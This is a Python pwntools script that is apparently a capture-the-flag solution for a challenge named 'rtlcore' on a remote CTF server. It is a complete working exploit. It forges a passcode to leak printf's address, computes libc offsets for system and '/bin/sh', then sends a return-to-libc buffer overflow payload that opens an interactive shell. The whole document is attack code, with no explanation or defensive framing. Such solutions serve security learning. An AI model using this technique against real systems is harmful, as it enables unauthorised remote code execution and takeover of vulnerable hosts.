from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3015)
#r = process('./rtlcore')
libc = ELF('./libc.so.6')

# Stage 1
# input passcode & Leak printf addr
passcode = ''
passcode += p32(0x2691f021) * 4
passcode += p32(0x2691f023)

r.sendlineafter(': ', passcode)
r.recvuntil('0x')
printf = r.recvn(8)
printf = int(printf, 16)

# Stage 2
# Leak Libc
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
binsh_offset = libc.search("/bin/sh").next()

libc_base = printf - printf_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.info("libc_base: "+hex(libc_base))
log.info("system: "+hex(system))
log.info("binsh: "+hex(binsh))

# Stage 3
# exploit
payload = ''
payload += "A"*66
payload += p32(system)
payload += "BBBB"
payload += p32(binsh)

r.send(payload)
r.interactive()
